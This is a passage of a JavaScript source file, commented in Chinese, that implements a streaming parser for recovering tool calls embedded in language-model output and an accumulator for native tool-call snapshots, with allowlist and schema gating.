    if (closer.end > afterFence) spanResolvedAt = position;
  }

  releaseProse(fullText.slice(position));
  // cleanedText 收尾 trim：登记的落点随前导空白平移（span 自身以非空白开头，
  // 不可能整段落在被削掉的前导区；尾部被削的贴边 span 由 stripToolCallResidue
  // 的前缀容差处理）。孤儿闭标记在**最终交付文本**上补登记（坐标系一致）。
  const leadingTrim = cleanedText.length - cleanedText.trimStart().length;
  const trimmedCleanedText = cleanedText.trim();
  const adjustedSpans = residueSpans.map(span => ({ ...span, at: span.at - leadingTrim }));
  recordOrphanBracketClosers(trimmedCleanedText, adjustedSpans);
  return {
    cleanedText: trimmedCleanedText,
    toolCalls,
    errors,
    warnings,
    residueSpans: adjustedSpans
  };
};

/**
 * 创建增量式工具调用流解析器
 * 接收 content delta，识别 tool_call 触发器与其后窗口内的 JSON 负载，
 * 对外吐出文本增量与已完成的工具调用对象。
 * 与 parseToolCallsFromText 共用触发器、闸门、窗口和负载抽取器；缓冲各管各的。
 * @returns {{
 *   push: (chunk: string) => { textDelta: string, recoveredText: string, completedCalls: Array<Object> },
 *   flush: () => { textDelta: string, recoveredText: string, completedCalls: Array<Object> },
 *   hasPendingCall: () => boolean,
 *   hasEmittedAnyCall: () => boolean
 * }} 解析器实例
 */
const createToolCallStreamParser = (options = {}) => {
  const allowedToolNames = normalizeAllowedToolNames(options.allowedToolNames);
  // 与整段路径同一条规则：无非空白名单就无抢救（名字闸门在旧语义下放行一切）。
  const salvage = !!allowedToolNames;
  // 引号修复 / 尾巴名字抢救的上下文 —— 与整段路径同一条规则：白名单 + toolSchemas
  // 齐备才存在（fail closed）。
  const repairSalvage = allowedToolNames && options.toolSchemas
    ? { allowedToolNames, toolSchemas: options.toolSchemas }
    : null;
  const errors = [];
  const warnings = [];
  // 被定罪原文的登记簿（与整段路径同义）：`{ text, at, channel }`。textDelta 与
  // recoveredText 是两个坐标系，channel 区分；at = 对应通道登记当刻的累计游标。
  // 被拒绝的合成负载（releaseRejectedSpan）不登记 —— 可能就是回答本身。
  const residueSpans = [];
  // 通道游标：登记落点用。
  let textDeltaLength = 0;
  let recoveredLength = 0;
  const code = createCodeContextTracker();
  let pendingText = '';
  let triggerText = '';
  let afterTrigger = '';
  let inToolCall = false;
  let syntheticTrigger = false;
  // 一个带闭标记的调用刚收尾：扫描循环里继续吞掉紧随其后的重复闭标记
  // （实测泄漏 #2）。重复可能被切在 chunk 边界上，所以不能在结算点一次吞完。
  let closerSwallow = false;
  let emittedCallCount = 0;
  let emittedProse = false;
  // 缓冲头是否处在**行首**：上一个放行到任一通道的字节是换行、还什么都没放行、或
  // 一个片段刚连闭标记一起被消费（整段路径的 spanResolvedAt）。行首状态必须跨 chunk
  // 边界携带：splitSafeText 会在 '{' 之前把正文放掉，没有这个标志，下一个 chunk 开头
  // 的 '{' 会冒充行首（review loop 1：`Here is an example: {…}\n[END TOOL CALL]` 在
  // chunk=1 时执行了、chunk=9 时没有）。
  let lineStart = true;

  const releaseProse = (result, text) => {
    if (!text) return;
    code.consume(text);
    textDeltaLength += text.length;
    result.textDelta += text;
    if (/\S/.test(text)) emittedProse = true;
    lineStart = lineStartBefore(text, text.length, lineStart);
  };

  // 被消费掉的协议残片：可见（textDelta），但不算“正文已经开始”、不喂围栏追踪器
  // —— 与整段路径的 releaseDebris 同一条先例。
  const releaseDebris = (result, text) => {
    if (!text) return;
    textDeltaLength += text.length;
    result.textDelta += text;
    lineStart = lineStartBefore(text, text.length, lineStart);
  };

  // 被闸门拒绝的合成负载：可见、置位 emittedProse、不喂围栏追踪器 ——
  // 三个取舍的理由见整段路径的同名函数。
  const releaseRejectedSpan = (result, text) => {
    if (!text) return;
    textDeltaLength += text.length;
    result.textDelta += text;
    if (/\S/.test(text)) emittedProse = true;
    lineStart = lineStartBefore(text, text.length, lineStart);
  };

  /**
   * 在等待触发器出现时，安全地输出已确定不是触发器前缀的部分
   * @param {string} text - 当前累积的文本
   * @returns {{ safe: string, remainder: string }} 切分结果
   */
  const splitSafeText = (text) => {
    // 触发器可能被切在两个 chunk 中间。宽松匹配无法像字面量那样逐前缀试探，改为按上界暂存：
    // 从最后一个 '<' 或 '['（两种触发器的头）起若不超过一个触发器的长度，就留到下一段再判断。
    // 正文里孤立的头字符最多延迟 TOOL_CALL_TRIGGER_MAX 个字符，flush() 兜底放出。
    const lastOpen = Math.max(text.lastIndexOf('<'), text.lastIndexOf('['));
    if (lastOpen !== -1 && text.length - lastOpen <= TOOL_CALL_TRIGGER_MAX) {
      return { safe: text.slice(0, lastOpen), remainder: text.slice(lastOpen) };
    }
    return { safe: text, remainder: '' };
  };

  /**
   * 结算一个已经触发的片段。
   *
   * 解析失败时把整段原文（含触发器）还给调用方 —— 但放在 recoveredText 里，不是
   * textDelta。调用方用“是否已经写过正文”来决定能不能重试；抢救回来的文字是
   * “这一轮失败了”的证据，不是模型给出的回答，一旦混进 textDelta，恰恰最该重试的
   * 那一轮（残缺 / 工具名无效）就再也重试不了。
   *
   * 触发了却根本没有负载是另一回事：那多半是模型在**谈论**这个标签，不是在调用。
   * 那段文字按正文放行（textDelta），只登记一条 warning —— 它不进 getErrors()，
   * 因为 OpenAI 路径上任何 parse error 且无调用就直接 invalid_tool_call，
   * 把今天的静默泄漏升级成硬报错。重试环路的处置留给后续，本次只“记录并放行”。
   *
   * @returns {string|null} 还需要继续按正文处理的剩余文本；null 表示要等更多输入
   */
  const resolveTriggered = (result, flushing) => {
    // consumed：片段连闭标记一起被消费掉了 —— 紧跟其后的缓冲头按行首对待
    // （整段路径的 spanResolvedAt）。
    // lineState：true = 片段连闭标记一起被消费（紧随其后的缓冲头按行首对待，整段路径的
    // spanResolvedAt）；false = 片段被消费但没有闭标记（最后消费的字节是负载的 '}'，同一行
    // 后面的 ` {…}` 是行中的 '{'，review loop 2）；undefined = 放行函数已经更新过 lineStart。
    const finish = (leftover, lineState) => {
      triggerText = '';
      afterTrigger = '';
      inToolCall = false;
      syntheticTrigger = false;
      if (lineState !== undefined) lineStart = lineState;
      return leftover;
    };

    // 合成开端：afterTrigger 从 '{' 开始（drain 里按构造保证）。闸门与整段路径的
    // resolveSyntheticAt 逐字对齐（parity 由测试钉住）：首位 + 闭标记 + 闸门不过 →
    // errors + recovered 通道（与规范触发器的错误分支同路）；正文之后 → 语义门，
    // 不过时负载可见、闭标记消费、只留 warning；闭标记缺席 → 可见文本。
    if (syntheticTrigger) {
      const afterProse = emittedProse;
      // 正文之后的配平封顶在 AFTER_PROSE_PAYLOAD_MAX（与整段路径同一上界，review loop 2）：
      // 一个 chunk 可能把缓冲从上界之内一口气带到"更远处配平"，那也按配不平结算。
      const object = afterProse
        ? extractAfterProseObject(afterTrigger, 0)
        : extractBalancedObject(afterTrigger, 0);
      if (!object) {
        // 缓冲上界：首位沿用 TOOL_CALL_SPAN_MAX；正文之后按 AFTER_PROSE_PAYLOAD_MAX
        // 封顶 —— 回答中间的一份大 JSON 不能把交付停到它配平。
        const cap = afterProse ? AFTER_PROSE_PAYLOAD_MAX : TOOL_CALL_SPAN_MAX;
        if (!flushing && afterTrigger.length <= cap) return null;
        // 首位、流已耗尽：定罪之前先抢救一次（与规范触发器的 truncated 分支同一纪律：
        // 半截负载还在路上时绝不发射；正文之后绝不抢救 —— 抢救保持位置门）。
        const salvaged = !afterProse && flushing && repairSalvage
          ? salvageTruncatedSpan(afterTrigger, repairSalvage)
          : null;
        if (salvaged) {
          result.completedCalls.push(createToolCallObject(salvaged.payload, emittedCallCount));
          emittedCallCount += 1;
          closerSwallow = true;
          return finish(afterTrigger.slice(salvaged.end), true);
        }
        // 配不平的候选是残片，切点见 findSyntheticDebrisCut（整段路径同一条规则）——
        // 后面写对了的调用不能陪葬。
        // 正文之后锚点只在 AFTER_PROSE_PAYLOAD_MAX 内找（与整段路径同一窗口）。
        const cut = findSyntheticDebrisCut(
          afterProse ? afterTrigger.slice(0, AFTER_PROSE_PAYLOAD_MAX) : afterTrigger,
          afterProse
        );
        let end = cut.end;
        if (!cut.found && !flushing && end >= afterTrigger.length) {
          // 切到了缓冲末尾但流还活着：留住尾部一个触发器长度（可能正断在半个触发器
          // 上），其余放行。缓冲已超上界（≫ TRIGGER_MAX），每轮至少剥掉 cap - TRIGGER_MAX。
          end = afterTrigger.length - Math.min(TOOL_CALL_TRIGGER_MAX, afterTrigger.length);
        }
        const debris = afterTrigger.slice(0, end);
        if (afterProse) {
          // 正文之后：可见、不登记、不落错误。切点是闭标记时闭标记之前的残片可见、
          // 闭标记（含重复）消费掉（review loop 2，与整段路径同一条规则）。
          warnings.push({ type: 'synthetic_rejected', reason: 'unbalanced payload', raw: '' });
          logSyntheticRejected('unbalanced payload');
          if (cut.viaCloser) {
            releaseProse(result, afterTrigger.slice(0, cut.closerStart));
            closerSwallow = true;
            return finish(afterTrigger.slice(end), true);
          }
          releaseProse(result, debris);
          return finish(afterTrigger.slice(end));
        }
        if (cut.viaCloser) {
          // 首位 + 闭标记在场 → 可证明是协议：硬错误，走 recovered 通道（与规范触发器
          // 的 truncated 分支同路），绝不作为正文上线；重复闭标记一并吞掉。
          const error = { type: 'truncated_tool_call', raw: debris };
          errors.push(error);
          logToolError(error);
          residueSpans.push({ text: debris, at: recoveredLength, channel: 'recovered' });
          recoveredLength += debris.length;
          result.recoveredText += debris;
          closerSwallow = true;
          return finish(afterTrigger.slice(end), true);
        }
        warnings.push({ type: 'synthetic_rejected', reason: 'unbalanced payload', raw: '' });
        logSyntheticRejected('unbalanced payload');
        residueSpans.push({ text: debris, at: textDeltaLength, channel: 'text' });
        releaseDebris(result, debris);
        return finish(afterTrigger.slice(end));
      }
      const closer = consumeMandatoryBracketCloser(afterTrigger, object.end, !flushing);
      if (closer.needMore) {
        // 上游可以永远只吐空白不收尾：等待闭标记的缓冲与其余路径同一个上界，
        // 超限按“闭标记缺席”落进下面的分支。
        if (afterTrigger.length <= TOOL_CALL_SPAN_MAX) return null;
      }
      if (!closer.found) {
        // 不进登记簿：被拒绝的负载可能就是回答本身（见登记簿头注释）。
        warnings.push({ type: 'synthetic_rejected', reason: 'missing closer', raw: '' });
        logSyntheticRejected('missing closer');
        releaseRejectedSpan(result, object.text);
        return finish(afterTrigger.slice(object.end));
      }
      const built = buildToolCallPayload(object.text, repairSalvage);
      if (afterProse) {
        const admitted = !built.error && gateAfterProsePayload(built.payload, repairSalvage);
        if (!admitted) {
          // 只登记错误类型，不登记 reason：invalid_json 的 reason 内嵌负载片段（见整段路径）。
          // 负载可见（不进登记簿：可能就是回答本身），闭标记（含重复）消费掉。
          const reason = built.error ? built.error.type : 'after-prose semantic gate';
          warnings.push({ type: 'synthetic_rejected', reason, raw: '' });
          logSyntheticRejected(reason);
          releaseRejectedSpan(result, object.text);
          closerSwallow = true;
          return finish(afterTrigger.slice(closer.end), true);
        }
        logAfterProsePromotion(built.payload.name, 'opener-less payload + closer');
        result.completedCalls.push(createToolCallObject(built.payload, emittedCallCount));
        emittedCallCount += 1;
        closerSwallow = true;
        return finish(afterTrigger.slice(closer.end), true);
      }
      const gateError = built.error || gateToolName(built.payload, allowedToolNames);
      if (gateError) {
        errors.push(gateError);
        logToolError(gateError);
        const span = afterTrigger.slice(0, closer.end);
        residueSpans.push({ text: span, at: recoveredLength, channel: 'recovered' });
        recoveredLength += span.length;
        result.recoveredText += span;
        // 硬拒绝的片段可证明是协议：重复闭标记一并吞掉（review loop 2 —— 第二个
        // `[END TOOL CALL]` 曾原样上线，整段路径却剥掉了它）。
        closerSwallow = true;
        return finish(afterTrigger.slice(closer.end), true);
      }
      result.completedCalls.push(createToolCallObject(built.payload, emittedCallCount));
      emittedCallCount += 1;
      closerSwallow = true;
      return finish(afterTrigger.slice(closer.end), true);
    }

    const suppress = (reason, log) => {
      warnings.push({ type: 'triggered_unrecovered', reason, raw: triggerText });
      log(triggerText, reason);
      releaseProse(result, triggerText);
      // 剩下的重新按正文扫描：里面可能还压着下一个触发器。
      return finish(afterTrigger);
    };

    const payloadAt = findPayloadStart(afterTrigger, 0, !flushing);
    if (payloadAt === -2) return null;
    if (payloadAt === -1) return suppress('no payload in window', logTriggeredUnrecovered);

    // tail 已经完整缓冲（在 '{' 之前），两条路径同一判断：Markdown 链接收尾不是调用。
    if (isMarkdownLinkTail(triggerText, afterTrigger.slice(0, payloadAt))) {
      return suppress('markdown link, not a call', logTriggerSuppressed);
    }

    const object = extractBalancedObject(afterTrigger, payloadAt);
    if (!object) {
      // 缓冲区有上界：一个永远配不平的 '{' 不能把整条流吃进内存。
      if (!flushing && afterTrigger.length <= TOOL_CALL_SPAN_MAX) return null;
      // 定罪之前的最后一搏（事故 3 的流式路径：flush 时引号奇偶仍是破的）。
      // 两道门（frozen Always，review loop 1）：只在流已耗尽（flushing）时抢救
      // —— 半截负载还在路上时发射 tool_use，剩余字节会继续按正文流出，绝不；
      // 位置门与规范调用一致（decision A）—— 正文出现过就压制。
      // 每段只到这里一次（finish 清掉 inToolCall），O(span)。
      const salvaged = flushing && repairSalvage && !emittedProse
        ? salvageTruncatedSpan(afterTrigger.slice(payloadAt), {
          ...repairSalvage,
          nameHint: extractTriggerNameHint(triggerText, afterTrigger.slice(0, payloadAt))
        })
        : null;
      if (salvaged) {
        result.completedCalls.push(createToolCallObject(salvaged.payload, emittedCallCount));
        emittedCallCount += 1;
        closerSwallow = true;
        return finish(afterTrigger.slice(payloadAt + salvaged.end), true);
      }
      const error = {
        type: 'truncated_tool_call',
        raw: afterTrigger,
        ...(afterTrigger.length > TOOL_CALL_SPAN_MAX ? { reason: 'span exceeded buffer cap' } : {})
      };
      errors.push(error);
      logToolError(error);
      // 登记边界与整段路径同一条规则：有闭标记时到闭标记结束，没有时只有触发器
      // + 尾巴（配不平的负载无从划界，宁可少剥也不吞回答）。
      const spanTail = afterTrigger.slice(payloadAt);
      const closerMatch = spanTail.match(TOOL_CALL_CLOSE_BRACKET_SCAN_RE);
      const condemnedEnd = closerMatch
        ? payloadAt + closerMatch.index + closerMatch[0].length
        : payloadAt;
      residueSpans.push({
        text: triggerText + afterTrigger.slice(0, condemnedEnd),
        at: recoveredLength,
        channel: 'recovered'
      });
      recoveredLength += triggerText.length + afterTrigger.length;
      result.recoveredText += triggerText + afterTrigger;
      return finish('', true);
    }

    const tail = afterTrigger.slice(0, payloadAt);
    const fence = skipTrailingFence(afterTrigger, object.end, tail, !flushing);
    if (fence.needMore) return null;
    const afterFence = fence.end;
    const closer = consumeTrailingCloser(afterTrigger, afterFence, !flushing);
    if (closer.needMore) return null;

    const spanEnd = Math.max(afterFence, closer.end);
    const span = triggerText + afterTrigger.slice(0, spanEnd);
    const leftover = afterTrigger.slice(spanEnd);
    // 带闭标记收尾的片段：吞掉重复闭标记，且紧随其后的缓冲头按行首对待（整段路径的
    // spanResolvedAt）；没有闭标记的片段两者都不做（review loop 2）。
    const withCloser = closer.end > afterFence;
    // 正文之后的触发器：语义门替代位置门 —— 见整段路径上的同一条规则与风险记录。
    // 不过门时不产生调用，但整段仍然吞掉（连带重复闭标记），两条通道都不给：
    // recoveredReasoning 在回合被接受后会写回客户端（openai-agent-runtime.js:410），
    // 放进去照样是裸协议泄漏；模型在 thinking 里写的 `checking <tool_call>{…}</tool_call>`
    // 正是这一种。这一段按构造就是工具标记而不是回答，丢掉与旧行为一致。
    if (emittedProse) {
      const built = repairSalvage
        ? buildToolCallPayload(object.text, { ...repairSalvage, nameHint: extractTriggerNameHint(triggerText, tail) })
        : null;
      const admitted = !!built && !built.error && gateAfterProsePayload(built.payload, repairSalvage);
      if (withCloser) closerSwallow = true;
      if (!admitted) {
        const reason = repairSalvage
          ? `after prose: ${built.error ? built.error.type : 'semantic gate rejected'}`
          : 'not the first content of the answer';
        warnings.push({ type: 'triggered_unrecovered', reason, raw: triggerText });
        logTriggerSuppressed(triggerText, reason);
        return finish(leftover, withCloser);
      }
      logAfterProsePromotion(built.payload.name, 'trigger after prose');
      result.completedCalls.push(createToolCallObject(built.payload, emittedCallCount));
      emittedCallCount += 1;
      return finish(leftover, withCloser);
    }

    const built = buildToolCallPayload(object.text, repairSalvage
      ? { ...repairSalvage, nameHint: extractTriggerNameHint(triggerText, tail) }
      : null);
    const error = built.error || gateToolName(built.payload, allowedToolNames);
    if (error) {
      errors.push(error);
      logToolError(error);
      // 失败片段不喂给代码上下文追踪器，也不算“正文已经开始” —— 与整段路径同一条规则。
      residueSpans.push({ text: span, at: recoveredLength, channel: 'recovered' });
      recoveredLength += span.length;
      result.recoveredText += span;
      // 硬拒绝的片段可证明是协议：带闭标记收尾时重复闭标记一并吞掉（与整段路径一致）。
      if (withCloser) closerSwallow = true;
      return finish(leftover, withCloser);
    }

    result.completedCalls.push(createToolCallObject(built.payload, emittedCallCount));
    emittedCallCount += 1;
    // 带闭标记收尾的调用布防重复闭标记的吞除 —— 与整段路径一致。
    if (withCloser) closerSwallow = true;
    return finish(leftover, withCloser);
  };

  /**
   * 扣留候选的**结构**位置（形状此时还判不了）：首位 = 缓冲头空白之后的 '{'；正文
   * 之后（带齐抢救上下文时）= 下一个行首 '{'。两者都只在正则触发器**之前**找 ——
   * 触发器之前的正文不含半个触发器（触发器不能跨换行，而行首候选之前必有换行），
   * 放行它是安全的。
   * @returns {{ index: number, afterProse: boolean }|null}
   */
  const findHoldCandidate = () => {
    const trigger = pendingText.match(TOOL_CALL_TRIGGER_RE);
    const limit = trigger ? trigger.index : pendingText.length;
    if (!emittedProse) {
      const braceAt = pendingText.search(/\S/);
      if (braceAt !== -1 && braceAt < limit && pendingText[braceAt] === '{' &&
          lineStartBefore(pendingText, braceAt, lineStart)) {
        return { index: braceAt, afterProse: false };
      }
    }
    if (!repairSalvage) return null;
    const at = nextLineStartBrace(pendingText, 0, lineStart, limit);
    return at === -1 ? null : { index: at, afterProse: true };
  };

  // 首位候选的扣留裁决（今天的规则）：形状齐了交给识别器；256 字符内有 "name"（或还
  // 没看满）就扣住；否则放行。
  const firstPositionHoldVerdict = (held) => {
    if (isLeakedToolPayloadShape(held)) return 'decide';
    if (held.length < LEAKED_PAYLOAD_NAME_WINDOW ||
        LEAKED_PAYLOAD_NAME_RE.test(held.slice(0, LEAKED_PAYLOAD_NAME_WINDOW))) {
      return 'hold';
    }
    return 'release';
  };

  // 正文之后候选的扣留裁决：两道窗口都是长度判断。
  const afterProseHoldVerdict = (held) => {
    const nameSeen = LEAKED_PAYLOAD_NAME_RE.test(held.slice(0, LEAKED_PAYLOAD_NAME_WINDOW));
    if (!nameSeen) return held.length < LEAKED_PAYLOAD_NAME_WINDOW ? 'hold' : 'release';
    if (LEAKED_PAYLOAD_ARGS_RE.test(held.slice(0, AFTER_PROSE_ARGS_WINDOW))) return 'decide';
    return held.length < AFTER_PROSE_ARGS_WINDOW ? 'hold' : 'release';
  };

  const drain = (chunk, result, flushing) => {
    let buffer = chunk;

    for (;;) {
      if (inToolCall) {
        afterTrigger += buffer;
        const leftover = resolveTriggered(result, flushing);
        if (leftover === null) return;
        buffer = leftover;
        continue;
      }

      pendingText += buffer;
      if (!pendingText) return;

      // 一个调用刚带着闭标记收尾：把紧随其后、已经能判定的重复闭标记吞掉
      // （与整段路径 consumeDuplicateClosers 同一条规则）。尾巴还是纯空白或半个
      // 闭标记前缀时扣住等下一个 chunk —— 调用早已发出，扣住的只是装饰性空白。
      if (closerSwallow) {
        const probe = pendingText.search(/\S/);
        if (probe === -1) {
          if (!flushing) return;
          closerSwallow = false;
        } else if (pendingText[probe] === '[' || pendingText[probe] === '<') {
          const dup = consumeTrailingCloser(pendingText, 0, !flushing);
          if (dup.needMore) return;
          if (dup.end > 0) {
            pendingText = pendingText.slice(dup.end);
            buffer = '';
            continue;
          }
          // 流死在半个重复闭标记上（`[END TOOL C` + EOF）：可行的字面前缀在
          // flush 时吞掉 —— 它是协议残片，不是回答；交付出去就是泄漏。
          if (flushing && isDanglingCloserPrefix(pendingText.slice(probe))) {
            pendingText = '';
            closerSwallow = false;
            return;
          }
          closerSwallow = false;
        } else {
          closerSwallow = false;
        }
      }

      // 代码上下文里**逐行**放行（review loop 2，与整段路径同一条规则）：围栏里的行首
      // '{' 是文档，本行没有触发器就整行放行、从下一行重扫 —— 一个大 chunk 里躺着
      // "围栏收尾 + 后面的真候选"时，识别器在 inCode 下会把整段当正文放掉，围栏关上
      // 之后的候选就丢了。触发器不能跨行，按行判断是精确的。行尾还没到就走下面的常规放行。
      if (code.inCode()) {
        const newline = pendingText.indexOf('\n');
        if (newline !== -1 && !TOOL_CALL_TRIGGER_RE.test(pendingText.slice(0, newline + 1))) {
          releaseProse(result, pendingText.slice(0, newline + 1));
          pendingText = pendingText.slice(newline + 1);
          buffer = '';
          continue;
        }
      }

      // 可能的合成开端还没揭晓：回答顶端（或上一个调用之后）只有空白 + 一个还没
      // 配平的 '{'；或者（带齐抢救上下文时）正文之后一个**行首**的 '{'。这一步必须在
      // 识别器**之前**：缓冲区更靠后可能已经躺着一个配好的正则触发器，若让它先行，
      // 流式就在候选判定完成前抢跑 —— 整段路径按位置从左到右结算，两条路径会对同一
      // 文本给出不同结果。扣留判定有界，全是长度判断，不逐 push 重扫整个缓冲：
      //   首位：扣满 LEAKED_PAYLOAD_NAME_WINDOW 个字符还没见到 "name" 就是普通 JSON 答案
      //         在流式输出，立刻放行；硬上界仍是 TOOL_CALL_SPAN_MAX。
      //   正文之后：从 '{' 起 256 字符内没有 "name"、或 4352 字符（256 + 4 KiB，同样从
      //         '{' 量起）内没有 "arguments" → 按正文放行（回答中间打印的一份 package.json
      //         不能让交付停到它配平）；
      //         形状齐了交给识别器，配平的等待上界是 AFTER_PROSE_PAYLOAD_MAX（resolveTriggered）。
      // 已配平的对象当场按谓词判定；不像负载的候选连同它所在的**整行**放行、从下一行
      // 重扫（下一行可能就是真候选，交给 splitSafeText 会把它当正文放掉）；flush 不扣留。
      if (!flushing && salvage && !code.inCode() && pendingText.length <= TOOL_CALL_SPAN_MAX) {
        const candidate = findHoldCandidate();
        if (candidate) {
          if (candidate.afterProse && candidate.index > 0) {
            // 候选之前的正文先放行（交付不等候选），候选挪到缓冲头。
            releaseProse(result, pendingText.slice(0, candidate.index));
            pendingText = pendingText.slice(candidate.index);
            candidate.index = 0;
          }
          let verdict;
          if (candidate.afterProse && code.inCode()) {
            // 放行的正文开了一道围栏：围栏里的行首 '{' 是文档，整行放行（行尾还没到
            // 就走下面的常规放行；行中不再产生候选）。
            verdict = 'release';
          } else {
            const held = pendingText.slice(candidate.index);
            if (extractBalancedObject(held, 0)) {
              const shape = candidate.afterProse
                ? isPlausibleAfterProsePayload(held)
                : isLeakedToolPayloadShape(held);
              verdict = shape ? 'decide' : 'release';
            } else {
              verdict = candidate.afterProse ? afterProseHoldVerdict(held) : firstPositionHoldVerdict(held);
            }
          }
          if (verdict === 'hold') return;
          if (verdict === 'release') {
            const newline = pendingText.indexOf('\n', candidate.index);
            if (newline !== -1) {
              releaseProse(result, pendingText.slice(0, newline + 1));
              pendingText = pendingText.slice(newline + 1);
              buffer = '';
              continue;
            }
            // 行尾还没到：走常规放行（splitSafeText 留住半个触发器），后续字节在行中。
          }
        }
      }

      // 代码上下文单独传给识别器（与整段路径同一条规则）：围栏/行内代码里的裸负载
      // 永远是文档。行首状态用 lineStart 跨 chunk 携带。
      const opening = matchToolCallOpening(pendingText, {
        emittedProse,
        canSalvage: salvage,
        canSalvageAfterProse: !!repairSalvage,
        inCode: code.inCode(),
        atLineStart: lineStart
      });
      if (opening) {
        const before = pendingText.slice(0, opening.index);
        releaseProse(result, before);
        const tail = pendingText.slice(opening.index + opening.text.length);
        pendingText = '';
        if (!opening.synthetic && code.inCode()) {
          warnings.push({ type: 'triggered_unrecovered', reason: 'inside code context', raw: opening.text });
          logTriggerSuppressed(opening.text, 'inside code context');
          releaseProse(result, opening.text);
        } else {
          triggerText = opening.text;
          syntheticTrigger = opening.synthetic;
          afterTrigger = '';
          inToolCall = true;
        }
        buffer = tail;
        continue;
      }

      if (flushing) {
        releaseProse(result, pendingText);
        pendingText = '';
        return;
      }

      const { safe, remainder } = splitSafeText(pendingText);
      releaseProse(result, safe);
      pendingText = remainder;
      return;
    }
  };

  const push = (chunk) => {
    const result = { textDelta: '', recoveredText: '', completedCalls: [] };
    if (typeof chunk !== 'string' || chunk.length === 0) return result;
    drain(chunk, result, false);
    return result;
  };

  const flush = () => {
    const result = { textDelta: '', recoveredText: '', completedCalls: [] };
    drain('', result, true);
    return result;
  };

  return {
    push,
    flush,
    hasPendingCall: () => inToolCall,
    hasEmittedAnyCall: () => emittedCallCount > 0,
    hasParseError: () => errors.length > 0,
    getErrors: () => [...errors],
    // 触发但无负载：单独一条通道，刻意不参与 hasParseError()。合成开端的拒绝
    // （synthetic_rejected）不算在内 —— 那些回合根本没有触发器，语义不能被翻转。
    hasTriggeredWithoutCall: () => warnings.some(w => w.type === 'triggered_unrecovered'),
    getWarnings: () => [...warnings],
    // 被定罪原文的登记簿：交付层剥残渣的唯一数据源（见 stripToolCallResidue）。
    getResidueSpans: () => residueSpans.map(span => ({ ...span }))
  };
};

const isCompleteJson = (text) => {
  try {
    JSON.parse(text);
    return true;
  } catch (_) {
    return false;
  }
};

/**
 * 累积原生工具调用。两种喂入模式，各自独立：
 *
 * 1. `push(deltas)` —— OpenAI 形状的 `delta.tool_calls`：按 index 键控，arguments 是**增量**，
 *    逐段拼接。语义原样保留（tests/tool-prompt.test.js:91-102）。
 * 2. `pushNativeSnapshot({ name, arguments, phase, functionId })` —— Qwen 网页端的
 *    `delta.function_call`：arguments 是**累积快照**（每帧带到目前为止的全文，最终快照
 *    发两遍，抓包 2026-09-01），因此是**替换**而非拼接；调用之间没有 index，靠帧的形状
 *    划界。并行调用串行到达（先 9 帧 SendMessage，再 10 帧 Bash）。
 *
 * 划界谓词（默认**合并** —— 误分裂 = 副作用执行两次，不可恢复；误合并 = JSON 不合法 →
 * 重试，可恢复）。新调用当且仅当：
 *   S1 双方都带 functionId 且不同；
 *   S2 入帧名字与打开中的调用不同（无名入帧不算不同）；
 *   S3 打开中的快照已是完整 JSON，且入帧 ≠ 它、也不以它为前缀；
 *   S4 入帧 arguments 为 '' 而打开中的非空；
 *   S5 当前没有打开中的调用（前一个已被边界关闭）。
 * 但 S5 下若入帧与本轮**已关闭**的某个调用 name+arguments 逐字节相同 → 重复帧，丢弃
 * （最终快照的副本跨过 result 帧到达时就是这个样子）。合并时保留最长的连贯快照：入帧
 * 更短而打开中的还不是完整 JSON → 保留旧的，记 snapshot_regression。
 *
 * 结构分类（全部消费者共用）：无 functionId 且 phase ∈ ANSWER_PHASES → **客户端候选**；
 * 否则是平台自有调用（code_interpreter / web_search 之类）→ 关闭时记 unknown_tool，
 * 保持今天"平台调用 → tool_error 重试"的语义，绝不发射。名字本身不是判据：客户端可以
 * 声明一个恰好叫 web_search 的工具。
 *
 * 关闭：closeByName(name) —— 带名字的 role:function 结果帧；closeOpen(reason) ——
 * 另一个调用开始 / 正文恢复 / 回合结束（reason 'round_end' 让不可解析的快照记
 * truncated_native_call 而非 invalid_arguments）。关闭即判定，错误每个调用只记一次：
 * missing_tool_name / unknown_tool（平台自有或不在白名单；白名单为空 fail closed）/
 * invalid_arguments（JSON 不合法或不是普通对象）/ truncated_native_call /
 * schema_mismatch（有 schema 且缺 required 键；多出的键只告警不拦 —— 与抢救闸门
 * gateSalvagedPayload 刻意不同，那道闸门对重塑文本 fail closed，这条通道的负载是模型
 * 原样写的）。
 *
 * 取出：takeCompleted() 只排出已关闭、过闸、尚未排出的客户端调用（id 为新 UUID，绝不回显
 * functionId）；finalize() 供旧消费者：先按 round_end 关闭打开中的，再一次性排出全部
 * 未排出的（两种模式），单发 —— 再次调用返回 []，不重记错误。
 * 统计：batchState() → { opened, closedByResult, gated }（只数客户端调用；平台调用两侧都
 * 不计），hasOpenClientCalls()。早停条件 = opened > 0 ∧ opened === closedByResult ∧ gated ≥ 1，
 * 由调用方在正文恢复帧上判定。
 *
 * @param {{ allowedToolNames?: Iterable<string>|Set<string>, toolSchemas?: Object<string, Object> }} [options]
 */
const createNativeToolCallAccumulator = (options = {}) => {
  const allowedToolNames = normalizeAllowedToolNames(options.allowedToolNames);
  const toolSchemas = options.toolSchemas && typeof options.toolSchemas === 'object' ? options.toolSchemas : null;
  const calls = new Map();
  const errors = [];
  const nativeCalls = [];
  let openCall = null;
  let emittedCount = 0;
  let finalized = false;

  const isClientCall = (call) => !call.functionId && ANSWER_PHASES.has(call.phase);

  const buildEmitted = (name, args) => ({
    index: emittedCount++,
    id: `call_${generateUUID().replace(/-/g, '').slice(0, 24)}`,
    type: 'function',
    function: { name, arguments: args }
  });

  /** 关闭即判定：过闸的标 emittable，其余记一次错误。 */
  const judgeNativeCall = (call) => {
    if (!call.name) {
      errors.push({ type: 'missing_tool_name', index: nativeCalls.indexOf(call) });
      return;
    }
    if (!isClientCall(call) || !allowedToolNames || !allowedToolNames.has(call.name)) {
      errors.push({ type: 'unknown_tool', name: call.name });
      return;
    }
    let parsed;
    try {
      parsed = JSON.parse(call.arguments);
    } catch (_) {
      errors.push({
        type: call.closeReason === 'round_end' ? 'truncated_native_call' : 'invalid_arguments',
        name: call.name
      });
      return;
    }
    if (!parsed || typeof parsed !== 'object' || Array.isArray(parsed)) {
      errors.push({ type: 'invalid_arguments', name: call.name });
      return;
    }
    if (toolSchemas && Object.prototype.hasOwnProperty.call(toolSchemas, call.name)) {
      const schema = toolSchemas[call.name];
      const required = Array.isArray(schema?.required) ? schema.required : [];
      const missing = required.filter(key => !Object.prototype.hasOwnProperty.call(parsed, key));
      if (missing.length) {
        errors.push({ type: 'schema_mismatch', name: call.name, missing });
        return;
      }
      const properties = schema?.properties;
      if (properties && typeof properties === 'object') {
